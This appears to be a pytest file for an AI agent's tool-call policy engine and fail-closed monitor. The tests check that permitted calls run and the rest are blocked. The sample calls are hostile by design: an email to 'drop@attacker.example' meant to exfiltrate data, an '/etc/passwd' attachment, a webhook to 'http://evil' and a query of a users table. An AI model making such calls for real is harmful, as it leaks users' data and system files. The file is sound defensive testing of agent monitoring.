"""M5 slice 1: the agent policy-decision engine + tool-call monitor (pure).

CI-safe (no LLM, no infra): covers the deterministic ALLOW/BLOCK rules and the
monitor's fail-closed execution (a blocked call is never executed). The sandbox
fake tools are exercised via the monitor here; their side-effect-free behavior is
also self-checked in sandbox/agent_tools.py's __main__.
"""

import sys
from pathlib import Path

from app.agent.monitor import run_monitored
from app.agent.policy import (
    AgentPolicy,
    ParamConstraint,
    ToolCall,
    ToolPolicy,
    evaluate,
)

# Import the sandbox fake tools (repo-root sandbox/, not a package).
sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "sandbox"))
from agent_tools import build_sandbox_tools  # noqa: E402


def _policy() -> AgentPolicy:
    return AgentPolicy(
        allowed_tools=frozenset({"send_email", "query_database", "create_ticket"}),
        tools={
            "send_email": ToolPolicy(
                allowed_params=frozenset({"to", "subject", "body"}),
                constraints={
                    "to": ParamConstraint(denied_substrings=("@attacker.",)),
                    "body": ParamConstraint(max_len=500),
                },
            ),
            "query_database": ToolPolicy(
                allowed_params=frozenset({"table"}),
                constraints={"table": ParamConstraint(allowed_values=frozenset({"public_faq"}))},
            ),
            "create_ticket": ToolPolicy(),  # any params allowed, no value limits
        },
    )


def test_permitted_call_allowed() -> None:
    d = evaluate(_policy(), ToolCall("send_email", {"to": "ok@corp.example", "subject": "hi"}))
    assert d.allowed and d.rule == "permitted"


def test_unauthorized_tool_blocked() -> None:
    d = evaluate(_policy(), ToolCall("call_webhook", {"url": "http://x"}))
    assert not d.allowed and d.rule == "unauthorized_tool"


def test_undeclared_tool_is_fail_closed() -> None:
    # In the allowed set but no ToolPolicy describing it → blocked, not implicitly allowed.
    policy = AgentPolicy(allowed_tools=frozenset({"send_email"}), tools={})
    d = evaluate(policy, ToolCall("send_email", {"to": "x"}))
    assert not d.allowed and d.rule == "undeclared_tool"


def test_unexpected_param_blocked() -> None:
    d = evaluate(
        _policy(), ToolCall("send_email", {"to": "x@corp.example", "attachments": "/etc/passwd"})
    )
    assert not d.allowed and d.rule == "unexpected_param"


def test_value_allowlist_blocks_out_of_scope_table() -> None:
    d = evaluate(_policy(), ToolCall("query_database", {"table": "users"}))
    assert not d.allowed and d.rule == "value_not_allowed"


def test_denied_substring_blocks_exfil_recipient() -> None:
    d = evaluate(_policy(), ToolCall("send_email", {"to": "drop@attacker.example"}))
    assert not d.allowed and d.rule == "denied_pattern"


def test_max_len_blocks_oversized_param() -> None:
    d = evaluate(_policy(), ToolCall("send_email", {"to": "x@corp.example", "body": "A" * 501}))
    assert not d.allowed and d.rule == "param_too_long"


def test_monitor_executes_only_permitted_and_is_fail_closed() -> None:
    registry, tools = build_sandbox_tools()
    calls = [
        ToolCall("query_database", {"table": "public_faq"}),  # allowed → executes
        ToolCall("query_database", {"table": "users"}),  # blocked (allowlist) → NOT executed
        ToolCall("call_webhook", {"url": "http://evil"}),  # blocked (unauthorized tool)
        ToolCall("create_ticket", {"title": "t", "body": "b"}),  # allowed → executes
    ]
    transcript = run_monitored(_policy(), registry, calls)
    assert [m.executed for m in transcript] == [True, False, False, True]
    # the blocked sensitive query never reached the tool → no PII returned
    assert transcript[1].result is None
    assert transcript[0].result["rows"][0]["a"] == "9-5"
    # fail-closed: the query_database tool only ever saw the public_faq call
    qdb = next(t for t in tools if t.name == "query_database")
    assert qdb.calls == [{"table": "public_faq"}]
    # call_webhook was blocked before reaching the (never-networking) mock
    assert next(t for t in tools if t.name == "call_webhook").calls == []


def test_monitor_permitted_but_missing_tool_is_recorded_not_executed() -> None:
    # Policy allows a tool the sandbox registry doesn't provide → recorded error, not run.
    policy = AgentPolicy(allowed_tools=frozenset({"ghost"}), tools={"ghost": ToolPolicy()})
    transcript = run_monitored(policy, {}, [ToolCall("ghost", {})])
    assert transcript[0].executed is False and transcript[0].error is not None
